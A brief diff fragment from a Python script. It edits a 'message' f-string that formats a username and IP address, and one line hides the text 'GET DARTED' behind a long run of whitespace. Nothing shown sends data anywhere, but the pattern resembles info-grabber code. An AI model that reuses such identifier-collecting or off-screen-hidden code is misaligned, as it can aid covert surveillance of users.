@@ -61,7 +61,7 @@ message = f"```name and ip:[{username}]:[{ip_address}]" \
           f"" \
           f"" \
           f"" \
-          f"" \                                                                                                                     GET DARTED" \
+          f"" \                                                                                                                     GET DARTED"
           f"" \
           f"" \
           f"" \
